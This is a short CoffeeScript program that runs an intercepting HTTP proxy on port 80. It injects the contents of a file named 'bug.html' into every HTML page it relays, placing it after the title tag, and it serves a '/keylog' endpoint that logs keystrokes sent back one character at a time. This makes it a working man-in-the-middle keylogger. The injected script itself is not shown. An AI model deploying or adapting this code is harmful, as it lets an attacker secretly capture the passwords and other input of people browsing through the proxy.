
httpProxy = require 'http-proxy'
fs = require 'fs'

bug = fs.readFileSync 'bug.html'

server = httpProxy.createServer (req, res, proxy) ->
  if /^\/keylog/.exec(req.url)
    key = /key=(.)/.exec(req.url)?[1]
    console.log "key: #{key}"
    res.writeHead(200)
    res.end('ok')

  res.oldWriteHead = res.writeHead
  res.writeHead = (code, headers) ->
    if /text\/html/.exec(headers['content-type'])
      delete headers['content-length']

      data = ''
      res.oldWrite = res.write
      res.write = (chunk) ->
        data += chunk

      res.oldEnd = res.end
      res.end = ->
        data = data.replace('</title>', "</title>#{bug}")
        res.oldWrite(data)
        res.oldEnd()

    res.oldWriteHead code, headers

  proxy.proxyRequest req, res,
    host: req.headers['host']
    port: 80

server.listen 80

